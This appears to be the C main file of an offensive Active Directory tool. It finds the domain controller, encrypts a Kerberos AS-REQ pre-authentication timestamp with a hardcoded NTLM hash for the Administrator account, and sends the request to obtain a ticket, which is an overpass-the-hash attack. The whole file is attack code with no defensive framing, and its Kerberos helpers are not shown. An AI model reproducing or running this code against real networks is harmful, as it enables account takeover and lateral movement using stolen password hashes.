
#include "socket.h"

//#include <Windows.h>
#include <stdio.h>
#include <Lm.h>
#include <DsGetDC.h>
#include <ntsecapi.h>
#include <strsafe.h>

#include "kerberos.h"

#pragma comment(lib, "NetApi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "netapi32.lib")

/// <summary>
/// Get the information related to the primary domain controller.
/// </summary>
/// <param name="ServerName">Server to query</param>
/// <param name="DomainName">Domain to query</param>
/// <param name="DCInformation">Pointer to the PDOMAIN_CONTROLLER_INFOW pointer of structure</param>
/// <returns>Whether the function executed successfully</returns>
NTSTATUS GetDomainControllerInformation(
	_In_opt_ LPCSTR                    ServerName,
	_In_opt_ LPCSTR                    DomainName,
	_Inout_  PDOMAIN_CONTROLLER_INFOA* DCInformation
) {
	// Get the informations
	DWORD Status = DsGetDcNameA(
		ServerName,
		DomainName,
		NULL,
		NULL,
		(DS_FORCE_REDISCOVERY | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME | DS_KDC_REQUIRED),
		DCInformation
	);
	if (Status != ERROR_SUCCESS)
		return STATUS_UNSUCCESSFUL;
	
	// Fix the domain name and ip address to remove the "\\"
	SIZE_T Size1 = strlen((*DCInformation)->DomainControllerName);
	SIZE_T Size2 = strlen((*DCInformation)->DomainControllerAddress);

	RtlCopyMemory((*DCInformation)->DomainControllerName, (*DCInformation)->DomainControllerName + 2, Size1 - 2);
	RtlCopyMemory((*DCInformation)->DomainControllerAddress, (*DCInformation)->DomainControllerAddress + 2, Size2 - 2);

	(*DCInformation)->DomainControllerName[Size1 - 2] = 0x00;
	(*DCInformation)->DomainControllerAddress[Size2 - 2] = 0x00;

	return STATUS_SUCCESS;
}

/// <summary>
/// Generate the final AS-REQ
/// </summary>
NTSTATUS GenerateASRequest(
	_In_  PCSTR  Key,
	_In_  PCSTR  DomainName,
	_In_  PCSTR  SecurityPrincipal,
	_Out_ PBYTE* Request,
	_Out_ INT32* RequestSize
) {
	// 1. PVNOP and MSG-TYPE
	ASN_ELEMENT Pvno = { 0x00 };
	ASN_ELEMENT MessageType = { 0x00 };
	KerbGeneratePvnoAndType(&Pvno, &MessageType);

	// 2 Generate and encrypt the timestamp
	ASN_ELEMENT EncryptedData = { 0x00 };
	KerbGenerateEncryptedData(Key, strlen(Key), &EncryptedData);

	// 3 Generate the PAC element
	ASN_ELEMENT Pac = { 0x00 };
	KerbGeneratePac(&Pac);

	// 4 Generate REQ-BODY
	ASN_ELEMENT ReqBody = { 0x00 };
	KerbGenerateKDCReqBody(
		DomainName,
		SecurityPrincipal,
		&ReqBody
	);

	// Encode everything
	PBYTE Data = NULL;
	INT32 DataSize = 0x00;
	KerbGenerateFinalRequest(
		&Pvno,
		&MessageType,
		&EncryptedData,
		&Pac,
		&ReqBody,
		Request,
		RequestSize
	);

	// Exit
	return STATUS_SUCCESS;
}

/// <summary>
/// Entry point.
/// </summary>
/// <returns>Application status code</returns>
INT main() {
	
	LPCSTR ServerName = NULL;
	LPCSTR DomainName = NULL;

	// 1. Get domain controller information
	NTSTATUS Status = STATUS_SUCCESS;
	PDOMAIN_CONTROLLER_INFOA DCInformation = NULL;
	Status = GetDomainControllerInformation(
		NULL,
		DomainName,
		&DCInformation
	);
	if (!NT_SUCCESS(Status))
		return EXIT_FAILURE;
	printf("[>] Domain name      : %s\r\n", DCInformation->DomainName);
	printf("[>] Domain controller: %s (%s)\r\n",
		DCInformation->DomainControllerName,
		DCInformation->DomainControllerAddress
	);

	// 2. Build AS-REQ with pre-auth
	LPSTR SecurityPrincipal = "Administrator";
	LPSTR NtlmHash = "7FACDC498ED1680C4FD1448319A8C04F";

	PBYTE Request     = NULL;
	INT32 RequestSize = 0x00;
	GenerateASRequest(
		NtlmHash,
		DCInformation->DomainName,
		SecurityPrincipal,
		&Request,
		&RequestSize
	);

	// 3. Send the data
	PBYTE Response     = NULL;
	INT32 ResponseSize = 0x00;
	SockSendKerberosASRequest(
		DCInformation->DomainControllerAddress,
		Request,
		RequestSize,
		&Response,
		&ResponseSize
	);

	// x. Cleanup and exit
exit:
	if (DCInformation != NULL)
		NetApiBufferFree(DCInformation);
	return EXIT_SUCCESS;
}